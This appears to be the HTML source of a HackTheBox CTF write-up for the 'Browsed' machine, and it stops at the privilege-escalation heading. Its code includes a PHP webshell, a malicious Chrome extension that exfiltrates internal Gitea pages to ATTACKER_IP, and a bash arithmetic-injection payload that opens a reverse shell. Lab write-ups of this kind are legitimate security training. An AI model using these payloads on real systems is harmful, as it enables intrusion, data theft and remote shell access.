@@ -1,0 +1,1317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Browsed - HTB Writeup · stxrless</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;1,300&family=Lora:ital,wght@0,400;1,400;1,500&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+:root {
+  --bg:           #080c0b;
+  --surface:      #0d1210;
+  --border:       #1a2420;
+  --border-light: #243330;
+  --ink:          #dce8e4;
+  --ink-dim:      rgba(220,232,228,0.55);
+  --ink-faint:    rgba(220,232,228,0.28);
+  --syne:         'Syne', sans-serif;
+  --mono:         'JetBrains Mono', monospace;
+  --serif:        'Lora', Georgia, serif;
+  --col:          700px;
+  --green:        #4dffb4;
+  --green-dim:    rgba(77,255,180,0.12);
+  --green-border: rgba(77,255,180,0.18);
+  --amber:        #ffc34d;
+  --amber-dim:    rgba(255,195,77,0.1);
+  --red:          #ff6b6b;
+  --red-dim:      rgba(255,107,107,0.08);
+  --blue:         #6bb5ff;
+  --blue-dim:     rgba(107,181,255,0.08);
+  --purple:       #b88dff;
+  --purple-dim:   rgba(184,141,255,0.08);
+}
+
+body {
+  background: var(--bg);
+  color: var(--ink);
+  font-family: var(--mono);
+  font-size: 13px;
+  font-weight: 300;
+  line-height: 1.65;
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* ── grid noise overlay ── */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background-image:
+    linear-gradient(rgba(77,255,180,0.015) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(77,255,180,0.015) 1px, transparent 1px);
+  background-size: 48px 48px;
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* ── header ── */
+.site-header {
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 1.4rem 3rem;
+  border-bottom: 1px solid var(--border);
+  background: rgba(8,12,11,0.92);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+}
+
+.brand {
+  text-decoration: none;
+  display: flex;
+  align-items: baseline;
+  gap: 0.5rem;
+}
+
+.brand-name {
+  font-family: var(--syne);
+  font-weight: 800;
+  font-size: 1.1rem;
+  letter-spacing: -0.02em;
+  color: var(--ink);
+}
+
+.brand-dot {
+  width: 5px;
+  height: 5px;
+  border-radius: 50%;
+  background: var(--green);
+  display: inline-block;
+  margin-bottom: 2px;
+  box-shadow: 0 0 8px var(--green);
+}
+
+.back-link {
+  font-family: var(--mono);
+  font-size: 0.6rem;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  color: var(--ink-faint);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.back-link:hover { color: var(--green); }
+
+/* ── hero ── */
+.hero {
+  position: relative;
+  z-index: 2;
+  max-width: var(--col);
+  margin: 0 auto;
+  padding: 5rem 2rem 0;
+}
+
+.meta-row {
+  display: flex;
+  align-items: center;
+  gap: 0.6rem;
+  flex-wrap: wrap;
+  margin-bottom: 1.8rem;
+}
+
+.tag {
+  font-family: var(--mono);
+  font-size: 0.55rem;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  padding: 2px 8px;
+  border-radius: 2px;
+  border: 1px solid;
+  font-weight: 400;
+  line-height: 1.8;
+}
+
+.tag-htb    { color: var(--green);  border-color: rgba(77,255,180,0.22);  background: var(--green-dim); }
+.tag-web    { color: var(--amber);  border-color: rgba(255,195,77,0.22);  background: var(--amber-dim); }
+.tag-ext    { color: var(--blue);   border-color: rgba(107,181,255,0.22); background: var(--blue-dim); }
+.tag-privesc{ color: var(--purple); border-color: rgba(184,141,255,0.22); background: var(--purple-dim); }
+
+.meta-date {
+  font-size: 0.6rem;
+  color: var(--ink-faint);
+  letter-spacing: 0.08em;
+  margin-left: 0.2rem;
+}
+
+.post-title {
+  font-family: var(--syne);
+  font-weight: 800;
+  font-size: clamp(2rem, 5vw, 3.2rem);
+  letter-spacing: -0.04em;
+  line-height: 1.05;
+  color: var(--ink);
+  margin-bottom: 0.9rem;
+}
+
+.post-title .accent { color: var(--green); }
+
+.post-subtitle {
+  font-family: var(--serif);
+  font-style: italic;
+  font-size: 1.05rem;
+  color: var(--ink-dim);
+  line-height: 1.7;
+  max-width: 540px;
+  margin-bottom: 2.8rem;
+  padding-bottom: 2.8rem;
+  border-bottom: 1px solid var(--border);
+}
+
+/* ── attack chain summary ── */
+.chain-summary {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 1px;
+  background: var(--border);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  overflow: hidden;
+  margin-bottom: 4rem;
+}
+
+.chain-cell {
+  background: var(--surface);
+  padding: 1rem 1.1rem;
+  display: flex;
+  flex-direction: column;
+  gap: 0.3rem;
+  transition: background 0.15s;
+}
+.chain-cell:hover { background: rgba(77,255,180,0.03); }
+
+.chain-n {
+  font-size: 0.5rem;
+  letter-spacing: 0.2em;
+  color: var(--green);
+  font-weight: 500;
+  text-transform: uppercase;
+}
+
+.chain-label {
+  font-family: var(--syne);
+  font-weight: 600;
+  font-size: 0.72rem;
+  color: var(--ink);
+  line-height: 1.3;
+  letter-spacing: -0.01em;
+}
+
+.chain-desc {
+  font-size: 0.6rem;
+  color: var(--ink-faint);
+  line-height: 1.5;
+  letter-spacing: 0.02em;
+}
+
+/* ── article ── */
+.article-wrap {
+  position: relative;
+  z-index: 2;
+  max-width: var(--col);
+  margin: 0 auto;
+  padding: 0 2rem 8rem;
+}
+
+/* ── section headings ── */
+.article-wrap h2 {
+  font-family: var(--syne);
+  font-weight: 700;
+  font-size: 0.7rem;
+  letter-spacing: 0.22em;
+  text-transform: uppercase;
+  color: var(--green);
+  margin: 4rem 0 1.4rem;
+  display: flex;
+  align-items: center;
+  gap: 0.8rem;
+}
+
+.article-wrap h2::before {
+  content: '';
+  display: block;
+  width: 24px;
+  height: 1px;
+  background: var(--green);
+  opacity: 0.5;
+  flex-shrink: 0;
+}
+
+.article-wrap h3 {
+  font-family: var(--syne);
+  font-weight: 600;
+  font-size: 0.85rem;
+  letter-spacing: 0.04em;
+  color: var(--ink);
+  margin: 2.5rem 0 1rem;
+}
+
+/* ── prose ── */
+.article-wrap p {
+  font-family: var(--serif);
+  font-size: 1rem;
+  line-height: 1.88;
+  color: var(--ink-dim);
+  margin-bottom: 1.3rem;
+}
+
+.article-wrap p strong {
+  font-weight: 600;
+  font-family: var(--mono);
+  font-size: 0.82rem;
+  color: rgba(220,232,228,0.85);
+  letter-spacing: 0.02em;
+}
+
+/* ── inline code ── */
+.article-wrap code {
+  font-family: var(--mono);
+  font-size: 0.77rem;
+  font-weight: 400;
+  color: var(--amber);
+  background: var(--amber-dim);
+  border: 1px solid rgba(255,195,77,0.15);
+  border-radius: 2px;
+  padding: 1px 5px;
+}
+
+/* ── code blocks ── */
+.article-wrap pre {
+  position: relative;
+  margin: 2rem 0;
+  border: 1px solid var(--border-light);
+  background: rgba(0,0,0,0.35);
+  border-radius: 4px;
+  overflow: hidden;
+}
+
+.article-wrap pre[data-file]::before {
+  content: attr(data-file);
+  display: block;
+  font-family: var(--mono);
+  font-size: 0.52rem;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--ink-faint);
+  padding: 0.55rem 1.2rem;
+  border-bottom: 1px solid var(--border);
+  background: rgba(255,255,255,0.018);
+}
+
+.article-wrap pre code {
+  display: block;
+  font-size: 0.77rem;
+  font-weight: 300;
+  color: #a8c4bc;
+  background: none;
+  border: none;
+  padding: 1.1rem 1.2rem;
+  line-height: 1.85;
+  overflow-x: auto;
+  word-break: normal;
+  white-space: pre;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border) transparent;
+}
+
+.article-wrap pre code .kw   { color: var(--green); }
+.article-wrap pre code .str  { color: var(--amber); }
+.article-wrap pre code .cmt  { color: var(--ink-faint); font-style: italic; }
+.article-wrap pre code .num  { color: var(--blue); }
+.article-wrap pre code .fn   { color: var(--purple); }
+
+/* ── terminal output block ── */
+.terminal {
+  margin: 2rem 0;
+  border: 1px solid var(--border-light);
+  border-top: 2px solid var(--green);
+  background: rgba(0,0,0,0.5);
+  border-radius: 0 0 4px 4px;
+  overflow: hidden;
+}
+
+.terminal-bar {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.6rem 1rem;
+  background: rgba(255,255,255,0.02);
+  border-bottom: 1px solid var(--border);
+}
+
+.terminal-dot {
+  width: 8px; height: 8px;
+  border-radius: 50%;
+}
+
+.dot-red    { background: #ff5f56; }
+.dot-yellow { background: #ffbd2e; }
+.dot-green  { background: #27c93f; }
+
+.terminal-title {
+  font-size: 0.55rem;
+  letter-spacing: 0.18em;
+  color: var(--ink-faint);
+  text-transform: uppercase;
+  margin-left: 0.3rem;
+}
+
+.terminal pre {
+  border: none;
+  background: none;
+  margin: 0;
+  border-radius: 0;
+}
+
+.terminal pre code {
+  padding: 1rem 1.2rem;
+  color: #7ec8a0;
+  font-size: 0.75rem;
+}
+
+/* ── callout boxes ── */
+.callout {
+  margin: 1.8rem 0;
+  padding: 1rem 1.3rem;
+  border-radius: 2px;
+  border-left: 2px solid;
+}
+
+.callout p {
+  font-family: var(--mono);
+  font-size: 0.75rem;
+  line-height: 1.75;
+  margin: 0;
+}
+
+.callout-discovery {
+  border-color: var(--green);
+  background: var(--green-dim);
+}
+.callout-discovery p { color: rgba(77,255,180,0.8); }
+.callout-discovery .callout-icon { color: var(--green); }
+
+.callout-warning {
+  border-color: var(--amber);
+  background: var(--amber-dim);
+}
+.callout-warning p { color: rgba(255,195,77,0.8); }
+
+.callout-insight {
+  border-color: var(--blue);
+  background: var(--blue-dim);
+}
+.callout-insight p { color: rgba(107,181,255,0.75); }
+
+.callout-label {
+  font-weight: 500;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  font-size: 0.55rem;
+  display: block;
+  margin-bottom: 0.4rem;
+  opacity: 0.7;
+}
+
+/* ── divider ── */
+.article-wrap hr {
+  border: none;
+  border-top: 1px solid var(--border);
+  margin: 4rem 0;
+}
+
+/* ── flag ── */
+.flag-box {
+  display: flex;
+  align-items: center;
+  gap: 1.4rem;
+  border: 1px solid var(--green-border);
+  background: var(--green-dim);
+  padding: 1rem 1.4rem;
+  border-radius: 3px;
+  margin: 2.4rem 0;
+}
+
+.flag-icon {
+  font-size: 1.2rem;
+  flex-shrink: 0;
+}
+
+.flag-label {
+  font-size: 0.5rem;
+  letter-spacing: 0.22em;
+  text-transform: uppercase;
+  color: var(--green);
+  font-weight: 500;
+  line-height: 1;
+  margin-bottom: 0.3rem;
+}
+
+.flag-value {
+  font-family: var(--mono);
+  font-size: 0.8rem;
+  color: rgba(220,232,228,0.85);
+  letter-spacing: 0.05em;
+}
+
+/* ── step annotation ── */
+.step-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin: 3.5rem 0 1rem;
+}
+
+.step-num {
+  font-family: var(--syne);
+  font-size: 3rem;
+  font-weight: 800;
+  color: var(--border-light);
+  line-height: 1;
+  letter-spacing: -0.05em;
+  user-select: none;
+  flex-shrink: 0;
+}
+
+.step-title {
+  font-family: var(--syne);
+  font-weight: 700;
+  font-size: 1.1rem;
+  color: var(--ink);
+  letter-spacing: -0.02em;
+  line-height: 1.2;
+}
+
+/* ── lists ── */
+.article-wrap ul {
+  list-style: none;
+  margin: 0.8rem 0 1.4rem;
+  display: flex;
+  flex-direction: column;
+  gap: 0.55rem;
+}
+
+.article-wrap ul li {
+  font-family: var(--serif);
+  font-size: 1rem;
+  color: var(--ink-dim);
+  line-height: 1.75;
+  padding-left: 1.4rem;
+  position: relative;
+}
+
+.article-wrap ul li::before {
+  content: '▸';
+  position: absolute;
+  left: 0;
+  color: var(--green);
+  font-size: 0.6rem;
+  top: 0.42rem;
+  line-height: 1;
+}
+
+.article-wrap ul li strong {
+  font-family: var(--mono);
+  font-size: 0.8rem;
+  font-weight: 500;
+  color: rgba(220,232,228,0.88);
+}
+
+/* ── scan table ── */
+.scan-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1.6rem 0;
+  font-family: var(--mono);
+  font-size: 0.73rem;
+}
+
+.scan-table th {
+  text-align: left;
+  padding: 0.45rem 1rem;
+  font-size: 0.53rem;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--ink-faint);
+  border-bottom: 1px solid var(--border-light);
+  font-weight: 400;
+}
+
+.scan-table td {
+  padding: 0.65rem 1rem;
+  border-bottom: 1px solid var(--border);
+  color: var(--ink-dim);
+  vertical-align: top;
+  line-height: 1.55;
+}
+
+.scan-table tr:last-child td { border-bottom: none; }
+.scan-table td:first-child { color: var(--amber); }
+
+/* ── post footer ── */
+.post-footer {
+  margin-top: 5rem;
+  padding-top: 2rem;
+  border-top: 1px solid var(--border);
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 1rem;
+}
+
+.post-footer-left {
+  font-size: 0.6rem;
+  color: var(--ink-faint);
+  letter-spacing: 0.1em;
+}
+
+.post-footer-right a {
+  font-size: 0.6rem;
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  color: var(--ink-faint);
+  text-decoration: none;
+  transition: color 0.15s;
+}
+.post-footer-right a:hover { color: var(--green); }
+
+/* ── responsive ── */
+@media (max-width: 700px) {
+  .site-header { padding: 1.2rem 1.4rem; }
+  .hero, .article-wrap { padding-left: 1.4rem; padding-right: 1.4rem; }
+  .chain-summary { grid-template-columns: 1fr 1fr; }
+  .post-title { font-size: 2rem; }
+  .step-num { font-size: 2rem; }
+}
+
+@media (max-width: 480px) {
+  .chain-summary { grid-template-columns: 1fr; }
+  .back-link { display: none; }
+}
+
+/* ── scrollbar ── */
+::-webkit-scrollbar { width: 3px; height: 3px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border-light); border-radius: 2px; }
+* { scrollbar-width: thin; scrollbar-color: var(--border-light) transparent; }
+
+/* ── subtle cursor ── */
+body { cursor: default; }
+a { cursor: pointer; }
+pre, code { cursor: text; }
+</style>
+</head>
+<body>
+
+<!-- header -->
+<header class="site-header">
+  <a href="/" class="brand">
+    <span class="brand-name">stxrless</span>
+    <span class="brand-dot"></span>
+  </a>
+  <a href="/" class="back-link">← all writeups</a>
+</header>
+
+<!-- hero -->
+<div class="hero">
+
+  <div class="meta-row">
+    <span class="tag tag-htb">HackTheBox</span>
+    <span class="tag tag-web">Upload Bypass</span>
+    <span class="tag tag-ext">Chrome Extension</span>
+    <span class="tag tag-privesc">Python Privesc</span>
+    <span class="meta-date">2026-03-28</span>
+  </div>
+
+  <h1 class="post-title">
+    Browsed<span class="accent">.</span>
+  </h1>
+
+  <p class="post-subtitle">
+    A file upload filter that feels solid - until you realise the server feeds your zip
+    directly into headless Chrome. What started as a search for a PHP webshell became
+    a deep-dive into malicious browser extensions, an internal Gitea instance, bash
+    arithmetic injection, and a Python bytecode swap to root.
+  </p>
+
+  <!-- attack chain grid -->
+  <div class="chain-summary">
+    <div class="chain-cell">
+      <span class="chain-n">01 · recon</span>
+      <span class="chain-label">SSH + nginx, upload endpoint</span>
+      <span class="chain-desc">nginx on 80, raw PHP, .zip upload form</span>
+    </div>
+    <div class="chain-cell">
+      <span class="chain-n">02 · foothold</span>
+      <span class="chain-label">Malicious Chrome Extension</span>
+      <span class="chain-desc">zip extracted to /tmp, loaded by headless Chrome</span>
+    </div>
+    <div class="chain-cell">
+      <span class="chain-n">03 · pivot</span>
+      <span class="chain-label">Internal Gitea via extension fetch</span>
+      <span class="chain-desc">browsedinternals.htb only reachable from within</span>
+    </div>
+    <div class="chain-cell">
+      <span class="chain-n">04 · rce</span>
+      <span class="chain-label">Bash Arithmetic Injection</span>
+      <span class="chain-desc">-eq operator in routines.sh, reverse shell as larry</span>
+    </div>
+    <div class="chain-cell">
+      <span class="chain-n">05 · privesc</span>
+      <span class="chain-label">Python .pyc Hijack</span>
+      <span class="chain-desc">world-writable __pycache__, sudo script, SUID bash</span>
+    </div>
+    <div class="chain-cell">
+      <span class="chain-n">06 · root</span>
+      <span class="chain-label">SUID bash -p</span>
+      <span class="chain-desc">chmod +s /bin/bash, root flag</span>
+    </div>
+  </div>
+
+</div>
+
+<!-- article body -->
+<div class="article-wrap">
+
+  <!-- ── RECON ── -->
+  <div class="step-header">
+    <span class="step-num">01</span>
+    <span class="step-title">Recon</span>
+  </div>
+
+  <p>
+    Nothing out of the ordinary from the initial scan - a standard nmap to start, service
+    versions and default scripts:
+  </p>
+
+  <pre data-file="nmap"><code>nmap -sV -sC $box</code></pre>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="terminal-dot dot-red"></span>
+      <span class="terminal-dot dot-yellow"></span>
+      <span class="terminal-dot dot-green"></span>
+      <span class="terminal-title">output</span>
+    </div>
+    <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
+80/tcp open  http    nginx 1.24.0 (Ubuntu)</code></pre>
+  </div>
+
+  <p>
+    SSH and a web server. Headed straight to the site.
+  </p>
+
+  <h3>Web Enumeration</h3>
+
+  <p>
+    The site had two interesting endpoints sitting out in the open:
+  </p>
+
+  <ul>
+    <li><strong>/samples.html</strong> - three example Chrome extensions available for download</li>
+    <li><strong>/upload.php</strong> - a form asking you to "Upload Chrome Extension (.zip)"</li>
+  </ul>
+
+  <p>
+    The <code>.php</code> extension was worth noting. No framework - just raw PHP files
+    served by nginx. The combination of raw PHP and a file upload form is historically
+    a comfortable neighbourhood for attackers.
+  </p>
+
+  <!-- ── UPLOAD BYPASS ── -->
+  <div class="step-header">
+    <span class="step-num">02</span>
+    <span class="step-title">Probing the Upload</span>
+  </div>
+
+  <p>
+    The classic approach: try things the form wasn't designed to accept and watch what
+    breaks. First, a plain <code>.txt</code> file:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="terminal-dot dot-red"></span>
+      <span class="terminal-dot dot-yellow"></span>
+      <span class="terminal-dot dot-green"></span>
+      <span class="terminal-title">response</span>
+    </div>
+    <pre><code>HTTP 200 - Invalid file type or size.</code></pre>
+  </div>
+
+  <p>
+    Rejected, but with a 200. Fine. What happens if we keep the <code>.txt</code> content
+    but lie about its type - setting <code>Content-Type: application/zip</code> in Burp?
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="terminal-dot dot-red"></span>
+      <span class="terminal-dot dot-yellow"></span>
+      <span class="terminal-dot dot-green"></span>
+      <span class="terminal-title">response</span>
+    </div>
+    <pre><code>HTTP 302 - Failed to unzip file.</code></pre>
+  </div>
+
+  <div class="callout callout-insight">
+    <span class="callout-label">💡 what this tells us</span>
+    <p>
+      The server accepted the request (header check passed) but failed when it tried to
+      actually unzip the contents. Two things confirmed: (1) validation is
+      Content-Type-based, not magic-bytes - trivially spoofable. (2) The server extracts
+      the archive server-side, which opens up a whole attack surface.
+    </p>
+  </div>
+
+  <h3>The PHP Webshell Attempt</h3>
+
+  <p>
+    The logical next move: zip up a PHP webshell and upload it. The server should extract
+    it, and if it lands anywhere near the web root, we have RCE.
+  </p>
+
+  <pre data-file="shell.php"><code>&lt;?php system($_GET["cmd"]); ?&gt;</code></pre>
+
+  <pre data-file="zip it up"><code>zip shell.zip shell.php</code></pre>
+
+  <p>
+    Uploaded successfully this time. Tried accessing it:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="terminal-dot dot-red"></span>
+      <span class="terminal-dot dot-yellow"></span>
+      <span class="terminal-dot dot-green"></span>
+      <span class="terminal-title">curl http://box/shell.php?cmd=whoami</span>
+    </div>
+    <pre><code>404 Not Found - nginx/1.24.0</code></pre>
+  </div>
+
+  <p>
+    The files extract fine, but they're not landing in the web root. PHP shells are useless
+    here. Back to studying the actual server behaviour.
+  </p>
+
+  <!-- ── THE REAL ATTACK SURFACE ── -->
+  <div class="step-header">
+    <span class="step-num">03</span>
+    <span class="step-title">The Breakthrough</span>
+  </div>
+
+  <p>
+    While staring at the server's terminal output after the upload, something completely
+    unexpected showed up in the logs:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="terminal-dot dot-red"></span>
+      <span class="terminal-dot dot-yellow"></span>
+      <span class="terminal-dot dot-green"></span>
+      <span class="terminal-title">server logs</span>
+    </div>
+    <pre><code>/opt/chrome-linux64/WidevineCdm/...
+
+Failed to load extension from: /tmp/extension_69cadbf8bb2c20.61981154
+Manifest file is missing or unreadable</code></pre>
+  </div>
+
+  <div class="callout callout-discovery">
+    <span class="callout-label">🔍 click</span>
+    <p>
+      Chrome is installed on this server. My zip was extracted to /tmp/ and Chrome
+      tried to load it as a browser extension. It failed only because there was no
+      manifest.json - that's Chrome's minimum requirement for any extension.
+      The machine is literally called "Browsed". The entire attack surface just revealed itself.
+    </p>
+  </div>
+
+  <p>
+    PHP webshells are completely irrelevant. Chrome doesn't execute PHP. The real vector
+    is a <strong>malicious Chrome extension</strong> - and the server is running headless
+    Chrome that auto-loads whatever we upload.
+  </p>
+
+  <h3>Building the Evil Extension - Attempt 1</h3>
+
+  <p>
+    A Chrome extension needs two things at minimum: a <code>manifest.json</code> to
+    describe it, and a background script to do the work. The first instinct was to read
+    local files and exfiltrate them.
+  </p>
+
+  <pre data-file="manifest.json"><code>{
+  "manifest_version": 3,
+  "name": "pwn",
+  "version": "1.0",
+  "background": {
+    "service_worker": "background.js"
+  },
+  "permissions": ["tabs", "storage", "webRequest"],
+  "host_permissions": ["&lt;all_urls&gt;"]
+}</code></pre>
+
+  <pre data-file="background.js - attempt 1"><code>fetch("file:///etc/passwd")
+  .then(r =&gt; r.text())
+  .then(data =&gt; fetch("http://ATTACKER_IP:8000/exfil?d=" + btoa(data)));</code></pre>
+
+  <p>
+    Zipped, uploaded - and this time Chrome actually loaded it. A real extension ID
+    was assigned:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="terminal-dot dot-red"></span>
+      <span class="terminal-dot dot-yellow"></span>
+      <span class="terminal-dot dot-green"></span>
+      <span class="terminal-title">chrome logs</span>
+    </div>
+    <pre><code>extension id:   fkoibhnaejgidpikppdehofgcnnhbhmj
+context_type:   BLESSED_EXTENSION
+
+Not allowed to load local resource: file:///etc/passwd
+Uncaught (in promise) TypeError: Failed to fetch</code></pre>
+  </div>
+
+  <p>
+    Chrome extensions can't access <code>file://</code> URIs. Security model prevents it.
+    Dead end on that angle - but while absorbing the logs, something else caught my eye
+    entirely.
+  </p>
+
+  <!-- ── INTERNAL GITEA ── -->
+  <div class="step-header">
+    <span class="step-num">04</span>
+    <span class="step-title">The Internal Network</span>
+  </div>
+
+  <p>
+    Buried in the network request logs was a stream of requests Chrome was making
+    <em>automatically</em> as part of its startup routine:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="terminal-dot dot-red"></span>
+      <span class="terminal-dot dot-yellow"></span>
+      <span class="terminal-dot dot-green"></span>
+      <span class="terminal-title">chrome network log</span>
+    </div>
+    <pre><code>NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/assets/css/index.css?v=1.24.5
+NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/assets/img/logo.svg
+NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/assets/js/webcomponents.js?v=1.24.5
+NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/assets/img/favicon.png</code></pre>
+  </div>
+
+  <div class="callout callout-discovery">
+    <span class="callout-label">🔍 discovery</span>
+    <p>
+      Those assets - theme-gitea-auto.css, webcomponents.js, index.js - are unmistakably
+      Gitea. There's an internal Git instance running at browsedinternals.htb, only reachable
+      from the server itself. We can't access it from outside. But our extension runs
+      inside Chrome on the server, so it absolutely can.
+    </p>
+  </div>
+
+  <h3>Proxying Through Chrome</h3>
+
+  <p>
+    The extension runs inside a browser that has access to the internal network.
+    We can use it as a proxy - make fetch requests to the internal Gitea and relay
+    the responses back to our listener.
+  </p>
+
+  <pre data-file="background.js - attempt 2"><code>fetch("http://browsedinternals.htb")
+  .then(r =&gt; r.text())
+  .then(data =&gt; fetch("http://ATTACKER_IP:8000/?d=" + btoa(data)));</code></pre>
+
+  <p>
+    Uploaded, set up a Python HTTP server to catch the callback - and immediately
+    got an error in the logs:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="terminal-dot dot-red"></span>
+      <span class="terminal-dot dot-yellow"></span>
+      <span class="terminal-dot dot-green"></span>
+      <span class="terminal-title">chrome console</span>
+    </div>
+    <pre><code>NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/  ← fetch succeeded
+
+[CONSOLE] "Uncaught (in promise) InvalidCharacterError:
+Failed to execute 'btoa' on 'WorkerGlobalScope':
+The string to be encoded contains characters outside of the Latin1 range."</code></pre>
+  </div>
+
+  <p>
+    The fetch to Gitea worked - but <code>btoa()</code> choked on non-Latin1 characters
+    in the HTML before the exfil request ever fired. One-character fix: swap
+    <code>btoa(data)</code> for <code>encodeURIComponent(data)</code>.
+  </p>
+
+  <pre data-file="background.js - working"><code>fetch("http://browsedinternals.htb")
+  .then(r =&gt; r.text())
+  .then(data =&gt; fetch("http://ATTACKER_IP:8000/?d=" + encodeURIComponent(data)));</code></pre>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="terminal-dot dot-red"></span>
+      <span class="terminal-dot dot-yellow"></span>
+      <span class="terminal-dot dot-green"></span>
+      <span class="terminal-title">attacker listener</span>
+    </div>
+    <pre><code>python3 -m http.server 8000
+
+127.0.0.1 - - "GET /?d=%3C%21DOCTYPE+html%3E%0A%3Chtml..." 200 -</code></pre>
+  </div>
+
+  <p>
+    We're receiving the internal Gitea homepage. The extension is acting as our browser
+    proxy. Time to explore.
+  </p>
+
+  <!-- ── GITEA → REPO ── -->
+  <div class="step-header">
+    <span class="step-num">05</span>
+    <span class="step-title">Digging Through Gitea</span>
+  </div>
+
+  <p>
+    Iterating through the Gitea instance - fetching pages and decoding the responses -
+    revealed a repository called <strong>MarkdownPreviewer</strong>. A Flask app. Two
+    endpoints, both interesting:
+  </p>
+
+  <ul>
+    <li><strong>/submit</strong> - Stored XSS / HTML injection (markdown converted to raw HTML, no sanitization)</li>
+    <li><strong>/routines/&lt;rid&gt;</strong> - passes the route parameter to a bash script</li>
+  </ul>
+
+  <h3>The Bash Script</h3>
+
+  <p>
+    The Python code for <code>/routines/&lt;rid&gt;</code> is direct:
+  </p>
+
+  <pre data-file="app.py"><code>@app.route('/routines/&lt;rid&gt;')
+def routines(rid):
+    subprocess.run(["./routines.sh", rid])
+    return "Routine executed !"</code></pre>
+
+  <p>
+    No shell injection here (it's using the list form of <code>subprocess.run</code>),
+    but <code>rid</code> goes straight to <code>routines.sh</code> as <code>$1</code>.
+    The bash script itself is where things unravel:
+  </p>
+
+  <pre data-file="routines.sh"><code>#!/bin/bash
+
+if [[ "$1" -eq 0 ]]; then
+  # Routine 0: Clean temp files
+  find "$TMP_DIR" -type f -name "*.tmp" -delete
+
+elif [[ "$1" -eq 1 ]]; then
+  # Routine 1: Backup data
+  tar -czf "$BACKUP_DIR/data_backup_$(date '+%Y%m%d_%H%M%S').tar.gz" "$DATA_DIR"
+
+# ... more routines ...
+
+else
+  log_action "Unknown routine ID: $1"
+fi</code></pre>
+
+  <div class="callout callout-warning">
+    <span class="callout-label">⚠ the bug</span>
+    <p>
+      The -eq operator performs arithmetic comparison in bash. When bash evaluates
+      [[ "$1" -eq 0 ]], it treats $1 in an arithmetic context. This means array
+      subscript syntax like a[$(command)] gets evaluated - and the command inside
+      $() executes. Classic bash arithmetic injection.
+    </p>
+  </div>
+
+  <!-- ── RCE ── -->
+  <div class="step-header">
+    <span class="step-num">06</span>
+    <span class="step-title">Remote Code Execution</span>
+  </div>
+
+  <p>
+    The plan: use the extension to POST to the Flask app's <code>/routines/</code>
+    endpoint with an injected payload that sends a reverse shell back to us.
+    The only complication is URL encoding - we need to be careful with double-encoding.
+    Wrapping the command in base64 solves it cleanly.
+  </p>
+
+  <pre data-file="background.js - final exploit"><code>const cmd = "bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/8000 0&gt;&amp;1";
+const b64  = btoa(cmd);
+
+// avoid double URL encoding by splitting the IFS-separated chain
+fetch(
+  "http://127.0.0.1:5000/routines/a[$("
+    + "echo${IFS}" + b64
+    + "|base64${IFS}-d|bash)]"
+);</code></pre>
+
+  <p>
+    Upload the extension, start a netcat listener, and wait:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="terminal-dot dot-red"></span>
+      <span class="terminal-dot dot-yellow"></span>
+      <span class="terminal-dot dot-green"></span>
+      <span class="terminal-title">nc -lvnp 8000</span>
+    </div>
+    <pre><code>Listening on 0.0.0.0 8000
+Connection received from 10.10.11.x
+
+bash: cannot set terminal process group: ...
+larry@browsed:/home/larry/markdownPreview$ whoami
+larry</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon">🚩</span>
+    <div>
+      <div class="flag-label">user flag</div>
+      <div class="flag-value">user.txt</div>
+    </div>
+  </div>
+
+  <!-- ── PRIVESC ── -->
+  <div class="step-header">
+    <span class="step-num">07</span>
+    <span class="step-title">Privilege Escalation</span>
+  </div>
+
+  <h3>sudo -l</h3>
+
+  <p>
